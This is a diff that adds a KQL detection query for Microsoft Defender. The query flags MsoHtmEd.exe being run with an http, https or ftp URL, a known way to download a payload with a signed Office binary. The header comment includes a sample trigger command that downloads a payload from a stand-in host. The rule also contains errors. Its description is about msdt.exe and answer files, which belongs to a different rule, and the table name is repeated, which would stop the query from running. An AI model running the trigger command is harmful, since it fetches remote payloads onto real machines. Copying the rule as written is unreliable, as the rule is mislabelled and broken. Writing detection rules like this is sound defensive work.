@@ -1,0 +1,16 @@
+// Title: Download Arbitrary Files Via MSOHTMED.EXE
+// Desc: Detects execution of "msdt.exe" using an answer file which is simulating the legitimate way of calling msdt via "pcwrun.exe" (For example from the compatibility tab)
+// Ref - https://lolbas-project.github.io/lolbas/OtherMSBinaries/MsoHtmEd/
+// MTRE: https://attack.mitre.org/techniques/T1105/ (TCommand and Control: Ingress Tool Transfer)
+// Severity: medium
+// Trigger: MsoHtmEd.exe https://example.com/payload
+// Usecase: It will download a remote payload and place it in the cache folder 
+// From: https://github.com/SigmaHQ/sigma/blob/master/rules/windows/proc_creation_win_lolbin_msohtmed_download.yml
+// By: Frankie Li
+// On: 15-05-2023
+DeviceProcessEvents 
+DeviceProcessEvents 
+| where ((FolderPath endswith @'\MSOHTMED.exe' or InitiatingProcessVersionInfoOriginalFileName =~ @'MsoHtmEd.exe' 
+    or ProcessVersionInfoOriginalFileName =~ @'MsoHtmEd.exe') 
+    and (ProcessCommandLine contains @'http://' or ProcessCommandLine contains @'https://' or ProcessCommandLine contains @'ftp://'))
+| project Timestamp, DeviceName, AccountName, InitiatingProcessParentFileName, FolderPath, ProcessCommandLine
